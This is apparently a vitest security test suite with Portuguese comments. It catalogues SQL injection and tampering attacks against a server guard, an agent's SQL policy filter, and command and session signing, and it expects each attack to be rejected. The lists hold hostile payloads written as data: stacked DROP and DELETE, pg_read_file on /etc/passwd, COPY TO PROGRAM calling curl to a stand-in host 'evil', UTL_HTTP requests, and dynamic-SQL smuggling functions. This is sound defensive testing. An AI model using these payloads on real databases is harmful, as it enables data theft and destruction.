import { describe, it, expect } from 'vitest'
import { createRequire } from 'node:module'
import { evaluateEndUserAccess } from '../tableAccess'
import { buildCommand } from '../relayPolicy'
import { signCommand } from '../commandSigning'
import { endUserCookieName, signEndUserSession, verifyEndUserSession } from '../sessionToken'

/**
 * Teste de invasão automatizado (sem tocar em produção): um catálogo de ataques contra as três barreiras.
 *  1. guard do servidor (primeira barreira, por texto);
 *  2. filtro de SQL do Agente (a barreira final, por tokens): nenhum SQL pode citar uma tabela com regra sem passar pelo filtro;
 *  3. assinatura dos comandos e sessão do usuário final.
 * Cada ataque é um caso: se um dia algum passar, este arquivo falha e mostra qual.
 */
const req = createRequire(import.meta.url)
const sqlPolicy = req('../../../../cli/sqlPolicy.js') as any
const { authorizeCommand, NonceCache } = req('../../../../cli/security.js') as any

process.env.RUNTIME_SESSION_SECRET = 'segredo-de-teste-0123456789abcdef'
const PID = '123e4567-e89b-42d3-a456-426614174000'
const OTHER = '99999999-9999-4999-8999-999999999999'
const SECRET = 'segredo-do-projeto-0123456789abcdef'

// ── 1. Guard do servidor ────────────────────────────────────────────────────────
const ctx = { allowedTables: new Set(['clientes', 'pedidos', 'usuarios']), authTable: 'usuarios' }
const guard = (p: Record<string, any>) => evaluateEndUserAccess({ action: 'select', table: 'clientes', ...p }, ctx)
const select = (sql: string, extra: Record<string, any> = {}) => guard({ query: sql, sql, ...extra })

describe('barreira 1 — guard do servidor recusa', () => {
  const ATAQUES: Array<[string, string]> = [
    ['tabela fora do projeto', 'SELECT * FROM tabela_secreta'],
    ['catálogo do sistema', 'SELECT * FROM pg_shadow'],
    ['catálogo com schema', 'SELECT * FROM pg_catalog.pg_user'],
    ['information_schema', 'SELECT table_name FROM information_schema.tables'],
    ['função de leitura de arquivo', "SELECT pg_read_file('/etc/passwd')"],
    ['importação de objeto grande', "SELECT lo_import('/etc/passwd')"],
    ['dblink', "SELECT * FROM dblink('host=x', 'select 1') AS t(a int)"],
    ['configuração do servidor', "SELECT set_config('x','y',false)"],
    ['comandos empilhados', 'SELECT * FROM clientes; DROP TABLE clientes'],
    ['empilhado com comentário', 'SELECT * FROM clientes; -- x\nDELETE FROM clientes'],
    ['DELETE disfarçado de select', 'DELETE FROM clientes WHERE 1=1'],
    ['UPDATE', 'UPDATE clientes SET nome = nome'],
    ['INSERT ... SELECT', 'INSERT INTO clientes SELECT * FROM clientes'],
    ['CTE que apaga', 'WITH x AS (DELETE FROM clientes RETURNING *) SELECT * FROM x'],
    ['COPY para programa', "COPY clientes TO PROGRAM 'curl evil'"],
    ['bloco DO', 'DO $$ BEGIN PERFORM 1; END $$'],
    ['SQL escondido em texto (PostgreSQL)', "SELECT query_to_xml('select * from pedidos', true, true, '')"],
    ['SQL escondido em texto (tabela inteira)', "SELECT table_to_xml('usuarios', true, false, '')"],
    ['SQL escondido em texto (ts_stat)', "SELECT * FROM ts_stat('select * from pedidos')"],
    ['SQL escondido em texto (Oracle)', "SELECT DBMS_XMLGEN.getXML('select * from pedidos') FROM dual"],
    ['pacote UTL do Oracle', "SELECT UTL_HTTP.REQUEST('http://evil') FROM dual"],
    ['segunda tabela por vírgula', 'SELECT * FROM clientes, tabela_secreta'],
    ['segunda tabela por JOIN', 'SELECT * FROM clientes JOIN tabela_secreta ON 1=1'],
    ['schema qualificado fora do projeto', 'SELECT * FROM "public"."tabela_secreta"'],
    ['coluna de senha na tabela de login', 'SELECT hash_senha FROM usuarios'],
    ['asterisco da tabela de login', 'SELECT usuarios.* FROM clientes JOIN usuarios ON 1=1'],
  ]
  for (const [nome, sql] of ATAQUES) it(nome, () => expect(select(sql).length, sql).toBeGreaterThan(0))

  it('ação que não é de usuário final (raw_sql, leitura de logs, sincronização)', () => {
    for (const action of ['raw_sql', 'read_logs', 'clear_logs', 'sync_bpm', 'get_users', 'validate_login']) {
      expect(guard({ action }).length, action).toBeGreaterThan(0)
    }
  })

  it('o campo `table` e as junções não escondem uma tabela de fora', () => {
    expect(guard({ table: 'tabela_secreta' }).length).toBeGreaterThan(0)
    expect(guard({ joins: [{ table: 'tabela_secreta' }] }).length).toBeGreaterThan(0)
    expect(guard({ filters: { 'tabela_secreta.id': '1' } }).length).toBeGreaterThan(0)
  })

  it('o uso normal passa', () => {
    expect(select('SELECT "nome", "id" FROM "clientes"')).toEqual([])
    expect(select('SELECT c.nome, p.status FROM clientes c JOIN pedidos p ON p.cliente_id = c.id')).toEqual([])
  })
})

// ── 2. Filtro de SQL do Agente ──────────────────────────────────────────────────
const access = {
  policies: [{ table: 'pedidos', conds: [{ column: 'funcionario_id', op: 'eq', values: ['7'] }] }, { table: 'segredos', deny: true, conds: [] }],
  flags: { clientes: { delete: false } },
}
// o filtro troca `pedidos` (como estiver escrito: com aspas, schema ou maiúsculas) por `(SELECT * FROM <tabela> WHERE (<regra>))`
const WRAP = /\(SELECT \* FROM (?:"?[\w$]+"?\s*\.\s*)?"?pedidos"? WHERE \([^()]*\)\)/gi
/** Depois de tirar os trechos que o filtro injetou, nenhuma tabela com regra pode estar "solta" numa posição de tabela. */
const leaks = (out: string, table: string) =>
  new RegExp(String.raw`\b(?:from|join|using|into|update|table|only|,)\s*(?:"?[\w$]+"?\s*\.\s*)?"?${table}"?\b`, 'i').test(out.replace(WRAP, 'WRAPPED'))

const DYNAMIC_SQL = /query_to_xml|table_to_xml|ts_stat|dbms_xmlgen|utl_http|execute\s+immediate/i

function filtered(sql: string, kind: 'select' | 'custom', db: 'postgres' | 'oracle' = 'postgres'): { out?: string; refused?: boolean } {
  try {
    return { out: kind === 'select' ? sqlPolicy.applyToSelect(sql, access, { dbType: db }) : sqlPolicy.guardCustom(sql, access, { dbType: db }) }
  } catch (e: any) {
    if (e?.name === 'PolicyError' || /Pol[ií]tica|permite|acesso|SQL/i.test(String(e?.message))) return { refused: true }
    throw e
  }
}

describe('barreira 2 — o filtro de SQL do Agente nunca deixa a tabela com regra "solta"', () => {
  const ATAQUES: Array<[string, string]> = [
    ['simples', 'SELECT * FROM pedidos'],
    ['entre aspas', 'SELECT * FROM "pedidos"'],
    ['com schema', 'SELECT * FROM public.pedidos'],
    ['com schema e aspas', 'SELECT * FROM "public"."pedidos"'],
    ['maiúsculas', 'SELECT * FROM PEDIDOS'],
    ['maiúsculas entre aspas (Oracle)', 'SELECT * FROM "PEDIDOS"'],
    ['com apelido', 'SELECT p.* FROM pedidos p'],
    ['com AS', 'SELECT p.id FROM pedidos AS p'],
    ['JOIN', 'SELECT * FROM clientes c JOIN pedidos p ON p.cliente_id = c.id'],
    ['LEFT JOIN', 'SELECT * FROM clientes c LEFT JOIN pedidos p ON p.cliente_id = c.id'],
    ['vírgula (junção antiga)', 'SELECT * FROM clientes, pedidos'],
    ['subconsulta no WHERE', 'SELECT * FROM clientes WHERE id IN (SELECT cliente_id FROM pedidos)'],
    ['subconsulta no SELECT', 'SELECT (SELECT count(*) FROM pedidos) FROM clientes'],
    ['subconsulta em FROM', 'SELECT * FROM (SELECT * FROM pedidos) x'],
    ['EXISTS', 'SELECT * FROM clientes c WHERE EXISTS (SELECT 1 FROM pedidos p WHERE p.cliente_id = c.id)'],
    ['CTE', 'WITH p AS (SELECT * FROM pedidos) SELECT * FROM p'],
    ['UNION', 'SELECT id FROM clientes UNION SELECT id FROM pedidos'],
    ['UNION ALL', 'SELECT id FROM pedidos UNION ALL SELECT id FROM pedidos'],
    ['LATERAL', 'SELECT * FROM clientes c, LATERAL (SELECT * FROM pedidos p WHERE p.cliente_id = c.id) x'],
    ['ONLY', 'SELECT * FROM ONLY pedidos'],
    ['TABLE', 'TABLE pedidos'],
    ['comentário entre FROM e a tabela', 'SELECT * FROM/**/pedidos'],
    ['comentário de linha', 'SELECT * FROM pedidos -- x'],
    ['comentário que esconde o fim', 'SELECT * FROM /* x */ pedidos /* y */ WHERE 1=1'],
    ['dollar-quote', 'SELECT $$ FROM pedidos $$ FROM pedidos'],
    ['quebra de linha e tabulação', 'SELECT *\nFROM\tpedidos'],
    ['WHERE já existente com OR', 'SELECT * FROM pedidos WHERE 1=1 OR 1=1'],
    ['DELETE', 'DELETE FROM pedidos'],
    ['UPDATE', 'UPDATE pedidos SET status = 1'],
    ['UPDATE ... FROM', 'UPDATE clientes SET nome = p.status FROM pedidos p WHERE p.cliente_id = clientes.id'],
    ['DELETE ... USING', 'DELETE FROM clientes USING pedidos p WHERE p.cliente_id = clientes.id'],
    ['INSERT', 'INSERT INTO pedidos (id) VALUES (1)'],
    ['INSERT ... SELECT', 'INSERT INTO clientes SELECT * FROM pedidos'],
    ['tabela fechada (deny)', 'SELECT * FROM segredos'],
    ['função que executa SQL de um texto', "SELECT query_to_xml('select * from pedidos', true, true, '')"],
    ['idem, nome entre aspas', `SELECT "query_to_xml"('select * from pedidos', true, true, '')`],
    ['idem, com schema', "SELECT pg_catalog.query_to_xml('select * from pedidos', true, true, '')"],
    ['ts_stat', "SELECT * FROM ts_stat('select * from pedidos')"],
    ['Oracle DBMS_XMLGEN', "SELECT DBMS_XMLGEN.getXML('select * from pedidos') FROM dual"],
    ['Oracle XMLTYPE + DBMS_XMLGEN', "SELECT xmltype(DBMS_XMLGEN.getXML('select * from pedidos')) FROM dual"],
    ['EXECUTE IMMEDIATE', "EXECUTE IMMEDIATE 'select * from pedidos'"],
    ['comentário para esconder a chamada', "SELECT query_to_xml/**/('select * from pedidos', true, true, '')"],
  ]

  for (const kind of ['select', 'custom'] as const) {
    for (const [nome, sql] of ATAQUES) {
      it(`${kind}: ${nome}`, () => {
        for (const db of ['postgres', 'oracle'] as const) {
          const r = filtered(sql, kind, db)
          if (r.refused) continue
          // SQL escondido dentro de um texto não pode chegar ao banco: tem que ser recusado, não "filtrado"
          expect(DYNAMIC_SQL.test(sql), `chegou ao banco sem ser recusado (${db}): ${sql}\n  saída: ${r.out}`).toBe(false)
          // UPDATE/DELETE direto na tabela: o filtro acrescenta a regra ao WHERE (não embrulha a tabela)
          if (/^\s*(update|delete)\s+(from\s+)?(?:"?[\w$]+"?\s*\.\s*)?"?pedidos"?\b/i.test(sql)) {
            expect(r.out, `${db}\n  entrada: ${sql}`).toContain(`"funcionario_id" = '7'`)
            continue
          }
          expect(leaks(r.out!, 'pedidos'), `${db}\n  entrada: ${sql}\n  saída:   ${r.out}`).toBe(false)
          if (/segredos/i.test(sql)) expect(r.out, 'tabela fechada').toContain('1 = 0')
        }
      })
    }
  }

  it('permissão da tabela: SQL próprio que apaga em tabela sem permissão de exclusão é recusado ou não atinge nada', () => {
    const r = filtered('DELETE FROM clientes WHERE id = 1', 'custom')
    expect(r.refused || /1 = 0/.test(r.out || '')).toBe(true)
  })
})

// ── 3. Assinatura e sessão ──────────────────────────────────────────────────────
describe('barreira 3 — assinatura dos comandos e sessão', () => {
  const security = () => ({ projectId: PID, secretToken: SECRET, nonces: new NonceCache() })
  const withAccess = { policies: [{ table: 'pedidos', conds: [{ column: 'funcionario_id', op: 'eq', values: ['7'] }] }], flags: {} }

  it('o navegador não consegue mandar o próprio `access` nem o token (o relay tira os dois)', () => {
    const c = buildCommand({ projectId: PID, event: 'sql_query', payload: { queryId: 'q', action: 'select', token: 'x', access: { policies: [], flags: {} } } }, SECRET)
    expect(c.access).toBeUndefined()
    expect(c.token).toBeUndefined()
  })

  it('tirar o `access` de um comando de usuário final (para virar "membro") invalida a assinatura', () => {
    const signed = signCommand(SECRET, 'sql_query', PID, { queryId: 'q', action: 'select', query: 'SELECT 1', access: withAccess })
    const { access: _drop, ...stripped } = signed as any
    expect(authorizeCommand('sql_query', stripped, security()).ok).toBe(false)
  })

  it('trocar os valores do `access` (afrouxar a regra) invalida a assinatura', () => {
    const signed: any = signCommand(SECRET, 'sql_query', PID, { queryId: 'q', action: 'select', query: 'SELECT 1', access: withAccess })
    const tampered = { ...signed, access: { policies: [], flags: {} } }
    expect(authorizeCommand('sql_query', tampered, security()).ok).toBe(false)
  })

  it('trocar o SQL, o projeto, o evento ou a hora invalida; a repetição do mesmo comando também', () => {
    const signed: any = signCommand(SECRET, 'sql_query', PID, { queryId: 'q', action: 'select', query: 'SELECT 1' })
    const s = security()
    expect(authorizeCommand('sql_query', { ...signed, query: 'SELECT * FROM usuarios' }, s).ok).toBe(false)
    expect(authorizeCommand('export_job_start', signed, s).ok).toBe(false)
    expect(authorizeCommand('sql_query', signed, { ...s, projectId: OTHER }).ok).toBe(false)
    expect(authorizeCommand('sql_query', { ...signed, ts: signed.ts - 3_600_000 }, s).ok).toBe(false)
    expect(authorizeCommand('sql_query', signed, s).ok).toBe(true)
    expect(authorizeCommand('sql_query', signed, s).ok).toBe(false) // repetição
  })

  it('assinar com outro token (alguém que só viu o canal) não vale', () => {
    const forged = signCommand('token-do-atacante-0123456789abcd', 'sql_query', PID, { queryId: 'q', action: 'select', query: 'SELECT 1' })
    expect(authorizeCommand('sql_query', forged, security()).ok).toBe(false)
  })

  it('cookie de usuário final: de outro projeto, adulterado, vazio ou com outro segredo não vale', () => {
    const mine = signEndUserSession({ pid: PID, sub: 'maria' })
    expect(verifyEndUserSession(mine, PID)?.sub).toBe('maria')
    expect(verifyEndUserSession(mine, OTHER)).toBeNull()
    expect(verifyEndUserSession(mine.slice(0, -2) + 'xx', PID)).toBeNull()
    const [body] = mine.split('.')
    expect(verifyEndUserSession(body + '.', PID)).toBeNull()
    expect(verifyEndUserSession('', PID)).toBeNull()
    expect(verifyEndUserSession('lixo', PID)).toBeNull()
    expect(endUserCookieName(PID)).not.toBe(endUserCookieName(OTHER))
  })

  it('sessão trocando o `sub` (virar outro usuário) invalida a assinatura', () => {
    const mine = signEndUserSession({ pid: PID, sub: 'maria' })
    const [body, sig] = mine.split('.')
    const forgedBody = Buffer.from(JSON.stringify({ ...JSON.parse(Buffer.from(body, 'base64url').toString()), sub: 'admin' })).toString('base64url')
    expect(verifyEndUserSession(`${forgedBody}.${sig}`, PID)).toBeNull()
  })
})
